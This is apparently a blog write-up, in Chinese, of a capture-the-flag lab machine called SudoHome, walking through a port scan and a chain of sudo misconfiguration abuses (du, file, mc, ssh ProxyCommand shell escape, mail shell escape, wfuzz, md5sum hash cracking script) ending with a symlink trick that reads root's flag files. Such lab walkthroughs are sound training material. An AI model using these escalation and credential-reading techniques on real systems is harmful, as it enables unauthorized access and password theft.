{"pageProps":{"postData":{"id":"群U靶机SudoHome_sunset","contentHtml":"<h1>SudoHome</h1>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-c\">➜  SudoHome nmap -p- -min-rate <span class=\"hljs-number\">10000</span> -n -Pn -sCV <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.149</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-11-23 13:29 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.149</span>\nHost is up (<span class=\"hljs-number\">0.0019</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.4</span>p1 Debian <span class=\"hljs-number\">5</span>+deb11u3 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">3072</span> f6:a3:b6:<span class=\"hljs-number\">78</span>:c4:<span class=\"hljs-number\">62</span>:af:<span class=\"hljs-number\">44</span>:bb:<span class=\"hljs-number\">1</span>a:a0:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">6b</span>:<span class=\"hljs-number\">98</span>:f7 (RSA)\n|   <span class=\"hljs-number\">256</span> bb:e8:a2:<span class=\"hljs-number\">31</span>:d4:<span class=\"hljs-number\">05</span>:a9:c9:<span class=\"hljs-number\">31</span>:ff:<span class=\"hljs-number\">62</span>:f6:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">84</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">9</span>d (ECDSA)\n|_  <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">3b</span>:ae:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">64</span>:<span class=\"hljs-number\">4f</span>:a5:<span class=\"hljs-number\">75</span>:b9:<span class=\"hljs-number\">4</span>a:b9:<span class=\"hljs-number\">81</span>:f9:<span class=\"hljs-number\">89</span>:<span class=\"hljs-number\">76</span>:<span class=\"hljs-number\">99</span>:eb (ED25519)\n<span class=\"hljs-number\">25</span>/tcp open  smtp    Postfix smtpd\n|_ssl-date: TLS randomness does not represent time\n|_smtp-commands: moban, PIPELINING, SIZE <span class=\"hljs-number\">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class=\"hljs-number\">8B</span>ITMIME, DSN, SMTPUTF8, CHUNKING\n| ssl-cert: Subject: commonName=PyCrt.PyCrt\n| Subject Alternative Name: DNS:PyCrt.PyCrt\n| Not valid before: <span class=\"hljs-number\">2025</span><span class=\"hljs-number\">-04</span><span class=\"hljs-number\">-01</span>T14:<span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">29</span>\n|_Not valid after:  <span class=\"hljs-number\">2035</span><span class=\"hljs-number\">-03</span><span class=\"hljs-number\">-30</span>T14:<span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">29</span>\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">62</span> ((Debian))\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">62</span> (Debian)\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).\nMAC Address: 08:00:27:E2:26:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host:  moban; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.27 seconds\n</span></code></pre>\n<ul>\n<li><code>22/tcp</code>: <strong>SSH</strong> - OpenSSH 8.4p1 (Debian)。这是一个比较新的版本，直接利用漏洞的可能性较低。通常是作为获取 Shell 后的持久化访问，或者在我们获得凭据后进行登录的入口。</li>\n<li><code>25/tcp</code>: <strong>SMTP</strong> - Postfix smtpd。邮件服务。值得注意的是 <code>smtp-commands</code> 中列出了 <code>VRFY</code> 命令。这是一个经典的信息泄露点，可以用来枚举系统上的有效用户名。同时，主机名被识别为 <code>moban</code>。</li>\n<li><code>80/tcp</code>: <strong>HTTP</strong> - Apache httpd 2.4.62 (Debian)。Web 服务是 CTF 中最常见的攻击入口。虽然 Apache 本身版本较新，但其上运行的 Web 应用很可能存在漏洞。Nmap 提示 <code>Site doesn't have a title</code>，说明可能是一个默认页面或者一个简单的应用。</li>\n</ul>\n<h3>枚举</h3>\n<p><code>80</code> 端口</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BASudoHome_sunset/image.png\" alt=\"image.png\"></p>\n<p>交互 <code>SSH</code></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BASudoHome_sunset/image1.png\" alt=\"image.png\"></p>\n<p>拿到一组凭据</p>\n<pre><code class=\"hljs language-c\">user1:<span class=\"hljs-number\">0</span>woA8Sr7I83R0ZwmnTcH\n</code></pre>\n<p>测试登录，成功进入</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BASudoHome_sunset/image2.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<h3>Got user2 via du</h3>\n<pre><code class=\"hljs language-c\">user1@SudoHome:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user1 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user1 may run the following commands on SudoHome:\n    (user2) NOPASSWD: /usr/bin/du\n</code></pre>\n<p>可以读取文件内容</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># 和 user1 一样存在 password.txt</span>\nuser1@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user2 /usr/bin/du /home/user2/password.txt\n4       /home/user2/password.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">user1@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user2 /usr/bin/du --files0-from=/home/user2/password.txt\n/usr/bin/du: cannot access <span class=\"hljs-string\">'tLPi3BLMG2zmwvZ5z9rh'</span>$<span class=\"hljs-string\">'\\n'</span>: No such file or directory\n</code></pre>\n<h3>Got user3 via file</h3>\n<pre><code class=\"hljs language-bash\">user2@SudoHome:/home/user1$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user2 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user2 may run the following commands on SudoHome:\n    (user3) NOPASSWD: /usr/bin/file\n</code></pre>\n<pre><code class=\"hljs language-bash\">user2@SudoHome:/home/user1$ <span class=\"hljs-built_in\">sudo</span> -u user3 /usr/bin/file -f /home/user3/password.txt \nTFqxDyfGO69DP1lyjt0f: cannot open `TFqxDyfGO69DP1lyjt0f<span class=\"hljs-string\">' (No such file or directory)\n</span></code></pre>\n<h3>Got user4 via mc</h3>\n<pre><code class=\"hljs language-bash\">user3@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user3 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user3 may run the following commands on SudoHome:\n    (user4) NOPASSWD: /usr/bin/mc\n</code></pre>\n<pre><code class=\"hljs language-bash\">user3@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user4 /usr/bin/mc -v /home/user4/password.txt\n</code></pre>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BASudoHome_sunset/image3.png\" alt=\"image.png\"></p>\n<h3>Got user5 via ssh</h3>\n<pre><code class=\"hljs language-bash\">user4@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user4 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user4 may run the following commands on SudoHome:\n    (user5) NOPASSWD: /usr/bin/ssh\n</code></pre>\n<pre><code class=\"hljs language-bash\">user4@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user5 /usr/bin/ssh -F ../user5/password.txt 127.0.0.1\n../user5/password.txt: line 1: Bad configuration option: gz5kerjfycayhzgj7gci\n../user5/password.txt: terminating, 1 bad configuration options\n</code></pre>\n<p>因为 ssh -F 读取的文件内容会将所有大写字母变成小写，所以直接拿 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">user4@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user5 /usr/bin/ssh -o ProxyCommand=<span class=\"hljs-string\">';sh 0&#x3C;&#x26;2 1>&#x26;2'</span> x\n$ <span class=\"hljs-built_in\">id</span>\nuid=1004(user5) gid=1004(user5) <span class=\"hljs-built_in\">groups</span>=1004(user5)\n</code></pre>\n<h3>Got user6 via rev</h3>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user5 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user5 may run the following commands on SudoHome:\n    (user6) NOPASSWD: /usr/bin/rev\n</code></pre>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -u user6 /usr/bin/rev /home/user6/password.txt | rev\nZ5cWU36wQhxAVGJbGwoL\n</code></pre>\n<h3>Got user7 via cp</h3>\n<pre><code class=\"hljs language-bash\">user6@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user6 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user6 may run the following commands on SudoHome:\n    (user7) NOPASSWD: /usr/bin/cp\n</code></pre>\n<pre><code class=\"hljs language-bash\">user6@SudoHome:~$ <span class=\"hljs-built_in\">touch</span> /tmp/read_me\nuser6@SudoHome:~$ <span class=\"hljs-built_in\">chmod</span> 777 /tmp/read_me \nuser6@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user7 /usr/bin/cp /home/user7/password.txt /tmp/read_me\nuser6@SudoHome:~$ <span class=\"hljs-built_in\">cat</span> /tmp/read_me \nHLoKAOu86miWIYKdyVx3\n</code></pre>\n<h3>Got user8 via mail</h3>\n<pre><code class=\"hljs language-bash\">user7@SudoHome:/home/user6$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user7 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user7 may run the following commands on SudoHome:\n    (user8) NOPASSWD: /usr/bin/mail\n</code></pre>\n<pre><code class=\"hljs language-bash\">user7@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user8 /usr/bin/mail -f /home/user8/password.txt\nMail version 8.1.2 01/15/2001.  Type ? <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>.\n<span class=\"hljs-string\">\"/home/user8/password.txt\"</span>: 0 messages\n&#x26; !<span class=\"hljs-built_in\">id</span>\nuid=1007(user8) gid=1007(user8) <span class=\"hljs-built_in\">groups</span>=1007(user8)\n&#x26; !<span class=\"hljs-built_in\">cat</span> ~/password.txt\nUxeGoUq8xqBRxyWVQPYK\n</code></pre>\n<h3>Got user9 via wfuzz</h3>\n<pre><code class=\"hljs language-bash\">user8@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user8 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user8 may run the following commands on SudoHome:\n    (user9) NOPASSWD: /usr/bin/wfuzz\n</code></pre>\n<pre><code class=\"hljs language-bash\">user8@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user9 /usr/bin/wfuzz -w /home/user9/password.txt -u <span class=\"hljs-string\">'http://127.0.0.1/FUZZ'</span>\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=\"hljs-string\">'s documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://127.0.0.1/FUZZ\nTotal requests: 1\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                                            \n=====================================================================\n\n000000001:   404        9 L      31 W       271 Ch      \"peqkSBCDKvVxxNwcq1j4\"                                                                                                                                             \n\nTotal time: 0\nProcessed Requests: 1\nFiltered Requests: 0\nRequests/sec.: 0\n</span></code></pre>\n<h3>Got user10 via md5sum</h3>\n<pre><code class=\"hljs language-bash\">user9@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user9 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user9 may run the following commands on SudoHome:\n    (user10) NOPASSWD: /usr/bin/md5sum\n</code></pre>\n<pre><code class=\"hljs language-bash\">user9@SudoHome:/home/user10$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 32\ndrwxr-xr-x  2 user10 user10 4096 Nov 16 08:47 .\ndrwxr-xr-x 12 root   root   4096 Nov 16 08:35 ..\n**-rw-------  1 user10 user10   26 Nov 16 08:48 .bash_history**\n-rw-r--r--  1 user10 user10  220 Apr 18  2019 .bash_logout\n-rw-r--r--  1 user10 user10 3526 Apr 18  2019 .bashrc\n-rw-------  1 root   root     13 Nov 16 08:47 .important\n**-rw-------  1 user10 user10   13 Nov 16 08:35 password.txt**\n-rw-r--r--  1 user10 user10  807 Apr 18  2019 .profile\n</code></pre>\n<pre><code class=\"hljs language-bash\">user9@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -u user10 /usr/bin/md5sum -t /home/user10/password.txt \n65e31d336be184593812c18533fa4fa2  /home/user10/password.txt\n\nuser9@SudoHome:/home/user10$ <span class=\"hljs-built_in\">sudo</span> -u user10 /usr/bin/md5sum /home/user10/.bash_history\nbe1f261edf72c51ce2e6a2b5c50439f1  /home/user10/.bash_history\n</code></pre>\n<p>直接通过 <code>md5sum</code> 读取出来的有换行符</p>\n<p>所以应该无法直接通过 john 无法爆破出来</p>\n<pre><code class=\"hljs language-bash\">➜  SudoHome john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=8\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n0g 0:00:00:01 DONE (2025-11-23 15:13) 0g/s 10030Kp/s 10030Kc/s 10030KC/s  fuckyooh21..*7¡Vamos!\nSession completed. \n</code></pre>\n<p>笨方法，特别慢，睡了一觉就好了</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># 目标哈希值（从上一步获取）</span>\nTARGET_HASH=<span class=\"hljs-string\">\"65e31d336be184593812c18533fa4fa2\"</span>\n\n<span class=\"hljs-comment\"># 字典文件路径（根据你的系统调整，/usr/share/wordlists/rockyou.txt 是常见的）</span>\nWORDLIST=<span class=\"hljs-string\">\"/usr/share/wordlists/rockyou.txt\"</span>\n\n<span class=\"hljs-comment\"># 检查字典文件是否存在</span>\n<span class=\"hljs-keyword\">if</span> [ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$WORDLIST</span>\"</span> ]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Error: Wordlist not found at <span class=\"hljs-variable\">$WORDLIST</span>\"</span>\n    <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Starting cracking process for hash: <span class=\"hljs-variable\">$TARGET_HASH</span>\"</span>\n\n<span class=\"hljs-comment\"># 逐行读取字典</span>\n<span class=\"hljs-keyword\">while</span> IFS= <span class=\"hljs-built_in\">read</span> -r password; <span class=\"hljs-keyword\">do</span>\n    <span class=\"hljs-comment\"># 关键步骤：使用 printf \"%s\\n\" 来为密码添加换行符，然后计算哈希</span>\n    <span class=\"hljs-comment\"># printf 比 echo -n 更可靠，能处理特殊字符</span>\n    <span class=\"hljs-comment\"># 计算出的哈希格式是 \"HASH  -\"，我们用 cut 提取哈希部分</span>\n    CURRENT_HASH=$(<span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$password</span>\"</span> | <span class=\"hljs-built_in\">md5sum</span> | <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">' '</span> -f1)\n\n    <span class=\"hljs-comment\"># 比较哈希值</span>\n    <span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CURRENT_HASH</span>\"</span> == <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$TARGET_HASH</span>\"</span> ]; <span class=\"hljs-keyword\">then</span>\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"===================================\"</span>\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Password FOUND: <span class=\"hljs-variable\">$password</span>\"</span>\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"===================================\"</span>\n        <span class=\"hljs-built_in\">exit</span> 0 <span class=\"hljs-comment\"># 找到后退出</span>\n    <span class=\"hljs-keyword\">fi</span>\n<span class=\"hljs-keyword\">done</span> &#x3C; <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$WORDLIST</span>\"</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Password not found in the wordlist.\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  SudoHome ./1.sh              \nStarting cracking process <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">hash</span>: 65e31d336be184593812c18533fa4fa2\nWordlist: /usr/share/wordlists/rockyou.txt\nChecked 400,000 lines... Current guess: my chemy\n===================================\nPassword FOUND at line 400474: morrinsville\n===================================\n</code></pre>\n<p>成功登录上去</p>\n<pre><code class=\"hljs language-bash\">user9@SudoHome:~$ su user10\nPassword: \nuser10@SudoHome:/home/user9$ \n</code></pre>\n<h3>Got root</h3>\n<pre><code class=\"hljs language-bash\">user10@SudoHome:~$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 32\ndrwxr-xr-x  2 user10 user10 4096 Nov 16 08:47 .\ndrwxr-xr-x 12 root   root   4096 Nov 16 08:35 ..\n-rw-------  1 user10 user10   26 Nov 16 08:48 .bash_history\n-rw-r--r--  1 user10 user10  220 Apr 18  2019 .bash_logout\n-rw-r--r--  1 user10 user10 3526 Apr 18  2019 .bashrc\n-rw-------  1 root   root     13 Nov 16 08:47 .important\n-rw-------  1 user10 user10   13 Nov 16 08:35 password.txt\n-rw-r--r--  1 user10 user10  807 Apr 18  2019 .profile\nuser10@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> user10 on SudoHome:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser user10 may run the following commands on SudoHome:\n    (ALL) NOPASSWD: /usr/bin/cat /home/user10/.important\n</code></pre>\n<p>因为 <code>.important</code> 是在我们家目录下，所以是可控的，打个链接就行</p>\n<pre><code class=\"hljs language-bash\">user10@SudoHome:~$ <span class=\"hljs-built_in\">rm</span> .important \n<span class=\"hljs-built_in\">rm</span>: remove write-protected regular file <span class=\"hljs-string\">'.important'</span>? <span class=\"hljs-built_in\">yes</span>\nuser10@SudoHome:~$ <span class=\"hljs-built_in\">ln</span> -s /root/root.txt .important\nuser10@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/cat /home/user10/.important\nflag{root-f522d1d715970073a6413474ca0e0f63}\n</code></pre>\n<p>突然发现没找到 user.txt，之前的用户文件夹下也没有，所以尝试在 <code>root</code> 目录下读，可以读到</p>\n<pre><code class=\"hljs language-bash\">user10@SudoHome:~$ <span class=\"hljs-built_in\">rm</span> .important \nuser10@SudoHome:~$ <span class=\"hljs-built_in\">ln</span> -s /root/user.txt .important\nuser10@SudoHome:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/cat /home/user10/.important\nflag{user-a609316768619f154ef58db4d847b75e}\n</code></pre>","title":"群U靶机 - SudoHome","date":"2025-11-23","updated":"2025-11-24","tags":["群U靶机","Linux","sudo"],"categories":"靶机","comments":true,"description":"SudoHome Recon PortScan 22/tcp: SSH OpenSSH 8.4p1 (Debian)。这是一个比较新的版本，直接利用漏洞的可能性较低。通常是作为获取 Shell 后的持久化访问，或者在我们获得凭据后进行登录的入口。 25/tcp: SMTP Postfix smtpd..."},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true}